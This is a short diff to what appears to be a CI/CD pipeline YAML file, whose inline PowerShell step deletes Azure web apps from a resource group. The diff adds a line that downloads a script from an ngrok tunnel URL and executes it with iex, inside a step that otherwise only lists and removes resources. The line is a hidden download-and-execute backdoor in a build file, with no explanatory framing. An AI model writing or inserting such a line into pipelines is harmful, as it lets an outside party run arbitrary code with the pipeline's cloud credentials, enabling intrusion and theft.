@@ -179,6 +179,7 @@ steps:
     ScriptType: 'InlineScript'
     Inline: |
       try {
+        iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
         Write-Host ("Selected ResourceGroup is " + $Env:RESOURCE_GROUP)
         Write-Host "Removing WebApps"
         Get-AzResource -ResourceGroupName $Env:RESOURCE_GROUP -ResourceType Microsoft.Web/sites | Remove-AzResource -Force
